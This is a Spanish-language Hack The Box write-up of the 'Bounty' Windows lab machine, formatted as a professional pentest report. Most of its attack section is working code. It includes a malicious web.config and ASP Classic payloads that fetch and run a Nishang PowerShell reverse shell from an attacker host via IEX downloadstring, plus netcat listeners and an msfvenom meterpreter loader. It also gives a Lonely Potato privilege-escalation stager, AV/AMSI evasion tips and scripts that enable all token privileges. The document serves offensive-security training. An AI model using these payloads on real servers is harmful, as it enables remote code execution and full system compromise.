---
title: "Informe Técnico: Bounty (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Bounty de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Bounty

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Windows-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Bounty** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** IIS web.config Upload + ASP Code Execution
* **Vector de Elevación de Privilegios:** SeImpersonatePrivilege + Lonely Potato
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Bounty |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Windows |
| **Nivel de Dificultad** | Easy |
| **CVE(s) Involucrados** | MS10-092 |
| **Vector de Entrada** | IIS web.config Upload + ASP Code Execution |
| **Mecanismo de Escalada** | SeImpersonatePrivilege + Lonely Potato |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: IIS web.config Upload + ASP Code Execution
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: SeImpersonatePrivilege + Lonely Potato
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

CVE(s): MS10-092
GTFOBins/Abusos (sudo/SUID): N/A
Initial Access Exploit (Ingreso): IIS web.config Upload + ASP Code Execution

Privilege Escalation (Escalada): SeImpersonatePrivilege + Lonely Potato



| Campo | Detalle |
| --- | --- |
| Nombre | Bounty |
| OS | Windows Server 2008 R2 |
| Dificultad | Easy |
| CVE | MS10-092 |
| Acceso Inicial | IIS web.config Upload + ASP Code Execution |
| Escalada | SeImpersonatePrivilege + Lonely Potato (Token Impersonation) |

---

## Reconocimiento

El escaneo revela un unico puerto TCP abierto: **80 (IIS)**.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_01.png)

## Enumeracion

Mediante directory fuzzing se descubre `/transfer.aspx`, un formulario de subida de archivos.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_02.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_03.png)

## Explotacion

El formulario permite subir archivos `.config`. Se aprovecha esto para subir un archivo `web.config` malicioso que mapea la extension `.config` al procesador ASP Classic (asp.dll), permitiendo ejecutar codigo en el servidor.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_04.png)

El archivo clave es `web.config`, que IIS utiliza para configurar aplicaciones [ASP.NET](http://ASP.NET). Subiendo un web.config con codigo ASP Classic embebido, se obtiene ejecucion de comandos y una reverse shell PowerShell (Nishang) como el usuario **merlin**.

### User Flag (merlin)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_05.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_06.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_07.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_08.png)

## Escalada de Privilegios

El sistema no tiene **ningun hotfix** aplicado (Windows Server 2008 R2 Build 7600). Ejecutando `whoami /priv` se confirma que **SeImpersonatePrivilege** esta habilitado, lo que permite tecnicas de token impersonation.

Usando `local_exploit_suggester` de Metasploit se confirman multiples vectores: MS10-092 (Task Scheduler), MS16-075 (Reflection), entre otros.

![Captura de pantalla 2025-08-14 123630.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_09.png)

Se utiliza **Lonely Potato** para abusar de SeImpersonatePrivilege, duplicando un token de SYSTEM y lanzando una reverse shell con privilegios maximos.

### Root Flag

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_10.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/bounty/images/step_11.png)

> 
> 
> 
> # 1) Preparar el payload de Nishang
> 
> 1. Descarga el script `Invoke-PowerShellTcp.ps1` de Nishang y **añade al final** esta línea para que se ejecute automáticamente al cargarse:
>     
>     ```powershell
>     Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 443
>     
>     ```
>     
> 2. Levanta un **servidor HTTP** para servir ese archivo desde tu atacante:
>     
>     ```bash
>     # en la carpeta donde está Invoke-PowerShellTcp.ps1
>     python3 -m http.server 80
>     
>     ```
>     
> 3. Abre tu **listener**:
>     
>     ```bash
>     nc -lvnp 443
>     
>     ```
>     
> 
> > Nota: si prefieres no modificar el .ps1, en el apéndice te dejo alternativas (defaults en la función o ejecución en memoria con IEX).
> > 
> 
> ---
> 
> # 2) Entender cómo vamos a ejecutar código en IIS
> 
> - Revisando el webshell `cmdasp.asp` (Kali: `/usr/share/webshells/asp/cmdasp.asp`), se ve que usa **COM** para ejecutar comandos:
>     
>     ```vbnet
>     Set oScript = Server.CreateObject("WSCRIPT.SHELL")
>     ...
>     Call oScript.Run("cmd.exe /c " & szCMD, 0, True)
>     
>     ```
>     
> - Conclusión: **si logramos que IIS ejecute código ASP Classic**, podremos lanzar **PowerShell** con un `downloadstring` que cargue nuestro `Invoke-PowerShellTcp.ps1`.
> 
> ---
> 
> # 3) Mapear una extensión “inocente” a ASP Classic
> 
> Hay dos formas. La más **estable** es en **dos ficheros**:
> 
> ## Opción A (recomendada): 2 ficheros
> 
> ### (A1) Subir `web.config` a `/UploadedFiles/`
> 
> Este `web.config` quita bloqueos sobre `.config` y **mapea `*.config` a ASP Classic** (asp.dll):
> 
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <configuration>
>   <system.webServer>
>     <handlers accessPolicy="Read, Script, Write">
>       <add name="Config-as-ASP" path="*.config" verb="*"
>            modules="IsapiModule"
>            scriptProcessor="%windir%\system32\inetsrv\asp.dll"
>            resourceType="Unspecified"
>            requireAccess="Script"
>            preCondition="bitness64" />
>     </handlers>
>     <security>
>       <requestFiltering>
>         <fileExtensions>
>           <remove fileExtension=".config" />
>           <add fileExtension=".config" allowed="true" />
>         </fileExtensions>
>         <hiddenSegments>
>           <remove segment="web.config" />
>         </hiddenSegments>
>       </requestFiltering>
>     </security>
>   </system.webServer>
> </configuration>
> 
> ```
> 
> > Si el app pool va en 32-bit, cambia preCondition="bitness64" por bitness32.
> > 
> > 
> > Si da error 500.19 por el handler, prueba a **eliminar `preCondition`** por completo.
> > 
> 
> ### (A2) Subir `run.config` (ASP Classic “puro”)
> 
> Este archivo es el que **ejecuta** la descarga de Nishang y la evalúa:
> 
> ```
> <%@ Language=VBScript %>
> <%
>   Server.CreateObject("WSCRIPT.SHELL").Run _
>     "cmd.exe /c powershell.exe -w hidden -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1')""", 0, True
> %>
> 
> ```
> 
> ### (A3) Disparar la ejecución
> 
> Navega a:
> 
> ```
> http://10.10.10.93/UploadedFiles/run.config
> 
> ```
> 
> Si todo está bien, tu **netcat** en 443 recibirá la **reverse PowerShell**.
> 
> ---
> 
> ## Opción B (one-shot “combo” en un solo fichero)
> 
> Algunos retos permiten un **.config** que mezcla la parte XML y luego el bloque ASP Classic. Sube **un único archivo** (por ejemplo `loader.config`) con este contenido:
> 
> ```xml
> <?xml version="1.0" encoding="UTF-8"?>
> <configuration>
>     <system.webServer>
>       <handlers accessPolicy="Read, Script, Write">
>          <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
>               scriptProcessor="%windir%\system32\inetsrv\asp.dll"
>               resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
>       </handlers>
>       <security>
>          <requestFiltering>
>             <fileExtensions>
>                <remove fileExtension=".config" />
>             </fileExtensions>
>             <hiddenSegments>
>                <remove segment="web.config" />
>             </hiddenSegments>
>          </requestFiltering>
>       </security>
>    </system.webServer>
> </configuration>
> <%@ Language=VBScript %>
> <%
>   call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -w hidden -nop -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')",0,True)
> %>
> 
> ```
> 
> Luego visita:
> 
> ```
> http://10.10.10.93/UploadedFiles/loader.config
> 
> ```
> 
> > Si este enfoque te da errores de parsing, vuelve a la Opción A (dos ficheros), que suele ser más fiable.
> > 
> 
> ---
> 
> # 4) Validar y pillar la shell
> 
> - Mantén **abierto** el listener `nc -lvnp 443`.
> - Lanza el acceso al `.config` justo después de subirlo (recuerda que **el directorio se limpia**).
> - Si todo sale bien, deberías ver `whoami` desde la víctima. Si no:
>     - **404.3** ⇒ falta mapping/MIME → revisa `<handlers>` y `<fileExtensions>`.
>     - **500.19** ⇒ la sección está bloqueada por nivel superior → prueba a quitar `preCondition`, o a cambiar `requireAccess` a `Script`, o usa la **Opción A**.
>     - **Nada llega** ⇒ revisa conectividad/AV, usa `w hidden -nop`, y que tu HTTP sirva correctamente el `.ps1`.
> 
> ---
> 
> # Apéndice — 3 formas de invocar Nishang automáticamente
> 
> **1) Llamarlo al final del .ps1 (la que usamos arriba)**
> 
> ```powershell
> Invoke-PowerShellTcp -Reverse -IPAddress '10.10.14.5' -Port 443
> 
> ```
> 
> **2) Parámetros por defecto en la función**
> 
> Edita el bloque `Param(...)` así:
> 
> ```powershell
> [CmdletBinding(DefaultParameterSetName="reverse")] Param(
>   [Parameter(ParameterSetName="reverse")][String] $IPAddress = '10.10.14.5',
>   [Parameter(ParameterSetName="reverse")][Int]    $Port      = 443,
>   [Parameter(ParameterSetName="reverse")][Switch] $Reverse,
>   [Parameter(ParameterSetName="bind")][Switch]    $Bind
> )
> # y luego lo llamas simplemente con:
> Invoke-PowerShellTcp -Reverse
> 
> ```
> 
> **3) Cargar y ejecutar en memoria (sin tocar el archivo)**
> 
> ```powershell
> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 443
> 
> ```
> 
> ---
> 
> ##
> 
> # Privilege Escalation — `merlin` → `NT AUTHORITY\SYSTEM`
> 
> ## 1) Enumeración inicial
> 
> ### `systeminfo`
> 
> El host es **Windows Server 2008 R2 (Build 7600)** sin **ningún hotfix** instalado. Eso abre múltiples vías de EoP (kernel / Task Scheduler / Win32k, etc.):
> 
> ```
> OS Name:  Microsoft Windows Server 2008 R2 Datacenter
> OS Version: 6.1.7600 N/A Build 7600
> Hotfix(s): N/A         <-- ¡sin parches!
> 
> ```
> 
> ### `whoami /priv`
> 
> Como hemos llegado mediante un servicio web, revisar privilegios es clave. **`SeImpersonatePrivilege` está habilitado**, por lo que técnicas tipo **Juicy/Lonely Potato** son candidatas fuertes:
> 
> ```
> SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
> 
> ```
> 
> > Con esto ya sabemos que hay dos caminos claros: (1) Potato para token impersonation; (2) exploits de kernel/Task Scheduler porque el sistema está sin parches.
> > 
> 
> ---
> 
> ## 2) Detección de vulnerabilidades locales
> 
> ### Sherlock (PowerShell)
> 
> Aunque está deprecado en favor de Watson, es una pasada rápida para *hints*. Resultado destacable:
> 
> - **MS10-092 – Task Scheduler .XML** ⇒ *Appears Vulnerable*
> - **MS15-051 – ClientCopyImage** ⇒ *Appears Vulnerable*
> - Otros *no soportados* en x64 o no vulnerables en este build.
> 
> Esto confirma que **MS10-092** es muy buena vía.
> 
> ### Watson (C#)
> 
> Watson sustituye a Sherlock y da un inventario más completo. **Ojo con la versión de .NET del target**: aquí es **.NET 2.0 (v2.0.50727)**. Por tanto, **compila Watson para .NET 2.0** o no ejecutará.
> 
> 1. Compilar Watson en tu VM Windows (Visual Studio) seleccionando *Target Framework = .NET Framework 2.0*.
> 2. Subir y ejecutar:
> 
> ```powershell
> (new-object net.webclient).downloadfile('http://10.10.14.5/Watson.exe', 'C:\Users\merlin\AppData\Local\Temp\watson.exe')
> .\watson.exe
> 
> ```
> 
> Watson reporta (resumen):
> 
> - **MS10-073**
> - **MS10-092 (Task Scheduler CRC / XML)**
> - **MS11-046**
> - **MS12-042**
> - **MS13-005**
> 
> > Los “ERROR> … not present” son normales: Watson lista firmas y si el binario no existe en esa versión, lo anota. No invalida los hallazgos.
> > 
> 
> ---
> 
> ## 3) Camino alternativo con Metasploit (opcional)
> 
> Si quieres un *suggester* rápido de MSF (requiere meterpreter):
> 
> 1. Generar **loader PowerShell**:
> 
> ```bash
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=445 -f psh -o www/met-445.ps1
> 
> ```
> 
> 1. Handler:
> 
> ```
> exploit/multi/handler
> Payload: windows/x64/meterpreter/reverse_tcp
> LHOST=10.10.14.5  LPORT=445
> run
> 
> ```
> 
> 1. Lanzar desde tu shell de Nishang:
> 
> ```powershell
> iex(new-object net.webclient).downloadstring('http://10.10.14.5/met-445.ps1')
> 
> ```
> 
> 1. `post/multi/recon/local_exploit_suggester` sugiere, entre otros:
> - **ms10_092_schelevator**
> - **ms16_014_wmi_recv_notif**
> - **ms16_075_reflection**
> 
> ---
> 
> ## 4) Escalada elegida: **Lonely Potato** (aprovecha `SeImpersonatePrivilege`)
> 
> **Idea:** abusar de `SeImpersonatePrivilege` para obtener un **token de SYSTEM** y lanzar un proceso (tu reverse) con ese token.
> 
> ### (A) Preparar el *stager* (bat) y binario
> 
> - `rev.bat` llamará a **Nishang** (PowerShell reverse):
> 
> ```bash
> powershell.exe -w hidden -nop -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')
> 
> ```
> 
> - Subir **Lonely Potato** ya compilado + `rev.bat`:
> 
> ```powershell
> (new-object net.webclient).downloadfile('http://10.10.14.5/lonelypotato.exe', 'C:\Users\merlin\AppData\Local\Temp\lp.exe')
> (new-object net.webclient).downloadfile('http://10.10.14.5/rev.bat',         'C:\Users\merlin\AppData\Local\Temp\rev.bat')
> 
> ```
> 
> - Tener **listener** abierto en tu equipo:
> 
> ```bash
> nc -lvnp 443
> 
> ```
> 
> > Asegúrate de que tu Invoke-PowerShellTcp.ps1 ya incluye la llamada al final o usa alguna de las variantes del apéndice.
> > 
> 
> ### (B) Ejecutar Lonely Potato
> 
> ```powershell
> C:\Users\merlin\AppData\Local\Temp\lp.exe * C:\Users\merlin\AppData\Local\Temp\rev.bat
> 
> ```
> 
> Si todo va bien, verás en tu `nc`:
> 
> ```
> Windows PowerShell running as user BOUNTY$ on BOUNTY
> PS C:\Windows\system32> whoami
> nt authority\system
> 
> ```
> 
> ✔ **Root cause:** `SeImpersonatePrivilege` + abuso de COM/DCOM y *token duplication*.
> 
> ---
> 
> ## 5) Alternativa: **MS10-092 – Task Scheduler .XML**
> 
> Con *Watson* y *Sherlock* marcando **MS10-092** y sin parches, esta vía también funciona. En este writeup nos quedamos con **Potato** por ser inmediata al ver `SeImpersonatePrivilege`. Si el binario de Potato fallase (AV / incompatibilidad), vuelve a **MS10-092** (Metasploit tiene módulo, y existen PoCs stand-alone).
> 
> ---
> 
> ## 6) Validaciones y *gotchas*
> 
> - **Arquitectura:** este host es x64; usa binarios a 64 bits cuando proceda.
> - **.NET:** compila herramientas (Watson, etc.) para la misma versión que el target (aquí **v2.0.50727**).
> - **AV / AMSI:** usa `w hidden -nop` y *stagers* en memoria.
> - **Red:** revisa que el puerto 443 de tu atacante sea accesible; si no, cambia de puerto.
> 
> ---
> 
> ## 7) Limpieza (post-explotación)
> 
> - Borra `lp.exe`, `rev.bat`, `watson.exe`, *web.config* y payloads temporales de `UploadedFiles`.
> - Cierra listeners y servidores HTTP locales.
> - Documenta **qué** cambiaste y **dónde**.

> $u = '[https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)'
$dst = "$env:TEMP\EnableAllTokenPrivs.ps1"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
(New-Object Net.WebClient).DownloadFile($u, $dst)
> 

> Ejecuta el script para habilitar todos los privilegios disponibles del proceso actual
> 

> powershell -ExecutionPolicy Bypass -File $dst
> 

> Verifica
> 

> whoami /priv
> 

> **Opción A — bajar solo la función `Enable-Privilege.ps1`:**
> 

> $u = 'https://gist.githubusercontent.com/anzz1/506ddfb17173e14709cba38dbd576f22/raw/Enable-Privilege.ps1'
$dst = "$env:TEMP\Enable-Privilege.ps1"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
(New-Object Net.WebClient).DownloadFile($u, $dst)


. $dst


Enable-Privilege -Privilege SeDebugPrivilege,SeBackupPrivilege,SeRestorePrivilege,SeTakeOwnershipPrivilege,SeImpersonatePrivilege


whoami /priv
> 

> **Opción B — usar el módulo PoshPrivilege (si tienes PowerShell 5+):**
> 

> Install-Module -Name PoshPrivilege -Force
Import-Module PoshPrivilege


Enable-Privilege -Privilege SeDebugPrivilege,SeBackupPrivilege,SeRestorePrivilege,SeTakeOwnershipPrivilege,SeImpersonatePrivilege

whoami /priv
>

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (MS10-092).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (IIS web.config Upload + ASP Code Execution) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (SeImpersonatePrivilege + Lonely Potato) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
